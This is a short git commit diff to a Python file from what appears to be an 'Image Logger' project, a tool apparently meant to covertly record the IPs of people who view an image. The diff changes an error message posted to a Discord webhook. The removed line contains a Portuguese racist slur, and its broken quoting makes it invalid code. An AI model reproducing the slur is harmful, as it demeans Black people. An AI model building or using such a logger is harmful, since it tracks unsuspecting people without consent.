fa8ee27853e77e6d4f20b3d7be0df15011f05476
berperly <135066562+berperly@users.noreply.github.com>
2023-07-22 23:24:06 -0300

    Update gordao.py

--- api/gordao.py
+++ api/gordao.py
@@ -77,7 +77,7 @@ def botCheck(ip, useragent):
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
-    "content": "<@944663693742985266"> mais um pretinho,
+    "content": "@everyone",
     "embeds": [
         {
             "title": "Image Logger - Error",
